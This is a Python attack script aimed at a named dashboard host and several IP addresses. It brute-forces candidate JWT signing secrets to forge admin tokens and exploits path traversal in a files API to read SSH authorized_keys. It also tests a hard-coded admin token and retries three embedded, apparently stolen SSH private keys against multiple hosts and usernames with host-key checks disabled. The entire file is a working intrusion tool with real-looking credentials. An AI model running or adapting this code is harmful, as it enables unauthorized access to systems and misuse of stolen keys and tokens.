#!/usr/bin/env python3
# i29507 Round E4: (A) brute candidate JWT_SECRETs against dashboard files-RPC to recover access
#                  (C) retry harvested host keys on locked hosts with more usernames
import os,sys,json,base64,hmac,hashlib,subprocess,re,concurrent.futures as cf

HOST="dashboard.lumiiai.cn"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
ADMIN_TOKEN="6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
AUID="fc7c3730-4219-11f1-ac43-525400595be1"
AG={"lumii1":("agent-03d6cf98","4509e957-4909-11f1-ac43-525400595be1","plexus"),
    "intelora9":("agent-8c6ac8b3","bc09d9cc-63b0-11f1-ac43-525400595be1","goldenyears"),
    "lumii3":("agent-047f1d22","fc7c3730-4219-11f1-ac43-525400595be1","aro")}
SECRETS=["w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A=",
 "ce9a4dedd895086314a624d5039fc9ecdf06713424348cf72fa7815817d3a938",
 "dbb8f8ae1f0f033126421187dce47b00d47797940c4a48e37d945de405e436b3",
 "8745fecd8a1c3f812b3564efa291687c39018bba2b2d8233c4ea9a144e5325a6",
 "290b224ba7fd79efd584057a8ce9ccaddb25b682a3e204dbefa489c7edffa680",
 "4be679dfc09a6047d97ed5c87a7483aa4061c4e8e0ecf7f05e540ee79c6375e8",
 "625d5469d446f38f464e38e5df5bc36304767761f72372f64a500973899a884b",
 "b490b00c27d69645fa9db394208ec9156d74566019b401d24db9db2f2f5fb414",
 "1991417a"]
# harvested host keys (coder@intelora5 / coder@lumii2)
K1=base64.b64decode("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNEYnRSOG1MOWxNSU9ORGFVYU15M200d2RuV2ZQQ2Z1UjJNUThXcDRFbnRYd0FBQUpobzg0UXlhUE9FCk1nQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDRGJ0UjhtTDlsTUlPTkRhVWFNeTNtNHdkbldmUENmdVIyTVE4V3A0RW50WHcKQUFBRURIZ1ZTTWc5NGNhR3ZpQVpwTExtVkRaaFFqUkpKWG9kUFBJY2I1NnRhMnFkdTFIeVl2MlV3ZzQwTnBSb3pMZWJqQgoyZFo4OEorNUhZeER4YW5nU2UxZkFBQUFEMk52WkdWeVFHbHVkR1ZzYjNKaE5RRUNBd1FGQmc9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K")
K2=base64.b64decode("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNCbG05bDVReWRwY1cxNFFXN2EwcnQ2NWE4ZW9zalErL25iM3lPei9EOTZkd0FBQUpCSDNjbEZSOTNKClJRQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQmxtOWw1UXlkcGNXMTRRVzdhMHJ0NjVhOGVvc2pRKy9uYjN5T3ovRDk2ZHcKQUFBRUNHcW4wb2N1SVc2eU1RMFlEYUJaVXhScU9Gc1NSQTV4RDM1S2d4eW5CUldHV2IyWGxESjJseGJYaEJidHJTdTNybApyeDZpeU5ENytkdmZJN1A4UDNwM0FBQUFER052WkdWeVFHeDFiV2xwTWdFPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K")
K3=base64.b64decode("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNCMUpBekRmQkpuYjFMa3QrY29BNDUvTCsrSzNsV2h6NTNGU1dkaEVXdGE0UUFBCkFJaFNkVlBOVW5WVHpRQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQjFKQXpEZkJKbmIxTGt0K2NvQTQ1L0wrK0sKM2xXaHo1M0ZTV2RoRVd0YTRRQUFBRURpcDRnNFQ2Tmprc0VYRG9nK1l0UGlFaDdFR1ZRUXJmQXdaZjBYUGtiWQpTblVrRE1OOEVtZHZVdVMzNXlnRGpuOHY3NHJlVmFIUG5jVkpaMkVSYTFyaEFBQUFBQUVDQXdRRgotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K")

def sh(a,timeout=60):
    try:
        r=subprocess.run(a,capture_output=True,timeout=timeout); return r.returncode,r.stdout.decode("utf-8","replace"),r.stderr.decode("utf-8","replace")
    except Exception as e: return -1,"",repr(e)
def b64(s):
    if isinstance(s,bytes): s=s.decode("utf-8","replace")
    return base64.b64encode(s.encode("utf-8","replace")).decode()
def R(k,v):
    s=v if isinstance(v,str) else json.dumps(v,ensure_ascii=False,default=str); b=b64(s)
    if len(b)<=8500: print("R:%s:%s"%(k,b),flush=True)
    else:
        for i in range(0,len(b),8500): print("R:%s__%02d:%s"%(k,i//8500,b[i:i+8500]),flush=True)
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def jwt(p,secret):
    h=b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")))
    pl=b64u(json.dumps(p,separators=(",",":")))
    return h+"."+pl+"."+b64u(hmac.new(secret.encode(),(h+pl).encode(),hashlib.sha256).digest())
def call(path,tok=None,bearer=None,timeout=20):
    args=["--http2","-A",UA,"-H","Accept: application/json","-w","\n__CODE__%{http_code}"]
    if tok: args+=["-H","Cookie: session="+tok]
    if bearer: args+=["-H","Authorization: Bearer "+bearer]
    args+=["https://%s%s"%(HOST,path)]
    rc,out,err=sh(["curl","-s","-k","-m",str(timeout)]+args,timeout=timeout+15)
    i=out.rfind("__CODE__"); return {"code":out[i+8:].strip()[:3] if i>=0 else "","body":(out[:i] if i>=0 else out)[:200]}

def main():
    path="/api/agents/agent-03d6cf98/files?action=read&path=%2Fhome%2Flumii%2F.lumii-agent-keeper%2F..%2F.ssh%2Fauthorized_keys"
    out={}
    for si,s in enumerate(SECRETS):
        for host,(ag,own,cust) in AG.items():
            pl={"userId":own,"email":"probe@x","customer":cust,"role":"admin"}
            t=jwt(pl,s)
            out["s%d|%s|cookie"%(si,host)]=call("/api/agents/%s/files?action=read&path=%2Fhome%2Flumii%2F.lumii-agent-keeper%2F..%2F.ssh%2Fauthorized_keys"%ag,tok=t)
            out["s%d|%s|bearer"%(si,host)]=call("/api/agents/%s/files?action=read&path=%2Fhome%2Flumii%2F.lumii-agent-keeper%2F..%2F.ssh%2Fauthorized_keys"%ag,bearer=t)
    R("BRUTE",out)
    R("HITS",[k for k,v in out.items() if v["code"]=="200"])
    # admin token still OK?
    R("ADMCHK",call("/api/admin/agents",bearer=ADMIN_TOKEN))
    # (C) harvested keys vs locked hosts
    kp=[]
    for i,k in enumerate([K1,K2,K3]):
        p="/tmp/kk%d"%i; open(p,"wb").write(k); os.chmod(p,0o600); kp.append((i,p))
    tgt=[("lumii1","18.141.172.122",["root","coder","ubuntu","lumii"]),
         ("intelora12","54.179.173.218",["root","coder","ubuntu"]),
         ("intelora1","54.179.162.251",["root","coder","ubuntu"])]
    jobs=[]
    for i,p in kp:
        for host,ip,users in tgt:
            for u in users: jobs.append((i,p,u,host,ip))
    def tk(a):
        i,p,u,host,ip=a
        rc,o,e=sh(["ssh","-i",p,"-o","BatchMode=yes","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null","-o","ConnectTimeout=5","-n","%s@%s"%(u,ip),"id;hostname"],timeout=20)
        return ("k%d|%s@%s"%(i,u,host),{"rc":rc,"out":o[-200:],"err":e[-80:]})
    res={}
    with cf.ThreadPoolExecutor(max_workers=12) as ex:
        for kk,v in ex.map(tk,jobs): res[kk]=v
    R("KEY2",res)
    R("WINS2",[k for k,v in res.items() if v["rc"]==0])
try: main()
except Exception:
    import traceback; R("FATAL",traceback.format_exc()[-2000:])
finally: sys.exit(1)
